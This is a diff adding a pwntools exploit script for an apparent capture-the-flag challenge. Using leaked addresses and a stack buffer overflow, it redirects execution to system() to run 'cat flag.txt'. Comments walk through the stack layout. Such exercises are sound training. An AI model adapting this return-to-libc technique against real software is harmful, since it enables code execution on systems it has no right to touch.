@@ -1,0 +1,67 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./no_xystem", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def main():
+    io = start()
+    text = io.recvuntil("Please enter your name:").decode('utf-8')
+
+    # the first leak gives us indication of the location of the system function
+    system_ptr = int(text.split()[0], 16) - 0x6a1cf*4
+    # the 6th leak gives us indication of the location of the stack, and such, the buffer
+    # the +44 is due to us putting the string 'cat flag.txt' UNDER the base pointer of the welcomeMe frame, 
+    # i.e. in the frame of main, to prevent system from overwriting it while executing. 
+    # (I did totally not sit here for hours wondering why my exploit doesnt work because exactly that happened...)
+    buffer_ptr = int(text.split()[5], 16) - 0x3e*4 + 44
+
+    # here are some more addresses I did not end up using
+    # execve_ptr = system_ptr + 0x21f54*4
+    # bash_ptr = int(text.split()[0], 16) - 0x16345*4
+    # bash_addr = struct.pack('<I', bash_ptr)
+    # execve_addr = struct.pack('<I', execve_ptr)
+
+    # of course the pabe machines behave differently, so here's the hardcoded values for PABE:
+    system_ptr = int(text.split()[3], 16) + 155930
+
+    # looking at the stack inside welcomeMe:
+    # ret addr
+    # saved base pointer 4 bytes
+    # filler 8 bytes
+    # name 20 bytes
+    # so we need to write 32 bytes before getting to the return address
+    # after that, the 'return address' system will return to after executing is stored.
+    # since we don't care, we can fill that with whatever (4 bytes)
+    # afterwards we need the pointer to the string that shall be passed to system() as parametre
+    # which is followed by the string
+     
+    system_addr = struct.pack('<I', system_ptr)
+    buffer_addr = struct.pack('<I', buffer_ptr)
+    injection = [b"a"*32] + [system_addr] + [b"PABE"] + [buffer_addr] + [b"cat flag.txt"] + [b'\0']
+    raw = b"".join(injection)
+    io.sendline(raw)
+    answer = (io.recvall()).split()[-1].decode("utf-8")
+    print(answer)
+
+
+
+if __name__ == "__main__":
+    main()
